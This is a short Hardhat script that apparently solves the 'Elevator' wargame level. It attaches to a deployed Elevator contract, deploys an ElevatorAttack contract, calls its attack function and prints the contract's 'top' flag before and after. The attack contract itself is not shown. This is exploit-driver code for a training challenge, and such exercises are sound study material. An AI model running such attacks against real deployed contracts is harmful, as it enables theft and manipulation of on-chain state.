import { ethers } from "hardhat";
import { Elevator__factory } from "../typechain/factories/contracts/Elevator.sol/Elevator__factory";
import { ElevatorAttack__factory } from "../typechain/factories/contracts/ElevatorAttack__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x6310bfd8126f1332D6ACc2FCd751016d9044020D";
    let elevator = new Elevator__factory(signer).attach(instance_address);
    console.log(await elevator.top());


    let attack = await new ElevatorAttack__factory(signer).deploy();
    await attack.deployed();

    let tx = await attack.attack(elevator.address);
    await tx.wait();
    console.log(await elevator.top());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
